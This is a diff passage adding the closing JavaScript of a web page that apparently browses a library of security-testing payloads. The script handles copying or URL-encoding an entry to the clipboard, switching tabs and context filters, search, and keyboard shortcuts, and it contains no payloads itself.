+/* ════════════════════════════════════════════════════════════════
+   COPY / ENCODE
+   ════════════════════════════════════════════════════════════════ */
+function flashBtn(btn, label, cls) {
+  const orig = btn.textContent;
+  btn.textContent = label;
+  btn.classList.add(cls);
+  setTimeout(() => {
+    btn.textContent = orig;
+    btn.classList.remove(cls);
+  }, 1500);
+}
+
+function copyPayload(idx, btn) {
+  const p = (PAYLOADS[activeCategory] || [])[idx];
+  if (!p) return;
+  navigator.clipboard.writeText(p.payload).then(() => {
+    flashBtn(btn, 'Copied!', 'flashed');
+    if (typeof showToast === 'function') showToast('Payload copied', 'success');
+  }).catch(() => {
+    flashBtn(btn, 'Failed', 'flashed');
+  });
+}
+
+function encodePayload(idx, btn) {
+  const p = (PAYLOADS[activeCategory] || [])[idx];
+  if (!p) return;
+  const encoded = encodeURIComponent(p.payload);
+  navigator.clipboard.writeText(encoded).then(() => {
+    flashBtn(btn, 'Copied!', 'flashed');
+    if (typeof showToast === 'function') showToast('URL-encoded payload copied', 'success');
+  }).catch(() => {
+    flashBtn(btn, 'Failed', 'flashed');
+  });
+}
+
+/* ════════════════════════════════════════════════════════════════
+   TAB SWITCHING
+   ════════════════════════════════════════════════════════════════ */
+document.getElementById('tab-bar').addEventListener('click', e => {
+  const btn = e.target.closest('.tab');
+  if (!btn) return;
+  activeCategory = btn.dataset.cat;
+  document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t === btn));
+  renderList();
+});
+
+/* ════════════════════════════════════════════════════════════════
+   CONTEXT CHIPS
+   ════════════════════════════════════════════════════════════════ */
+document.getElementById('context-chips').addEventListener('click', e => {
+  const btn = e.target.closest('.chip');
+  if (!btn) return;
+  activeCtx = btn.dataset.ctx;
+  document.querySelectorAll('.chip').forEach(c => c.classList.toggle('active', c === btn));
+  renderList();
+});
+
+/* ════════════════════════════════════════════════════════════════
+   SEARCH
+   ════════════════════════════════════════════════════════════════ */
+document.getElementById('search-input').addEventListener('input', e => {
+  searchQuery = e.target.value;
+  renderList();
+});
+
+/* ════════════════════════════════════════════════════════════════
+   KEYBOARD SHORTCUT — focus search on /
+   ════════════════════════════════════════════════════════════════ */
+document.addEventListener('keydown', e => {
+  if (e.key === '/' && document.activeElement.tagName !== 'INPUT' && document.activeElement.tagName !== 'TEXTAREA') {
+    e.preventDefault();
+    document.getElementById('search-input').focus();
+  }
+  if (e.key === 'Escape') {
+    document.getElementById('search-input').blur();
+  }
+});
+
+/* ════════════════════════════════════════════════════════════════
+   INIT
+   ════════════════════════════════════════════════════════════════ */
+renderList();
+</script>
+</body>
+</html>
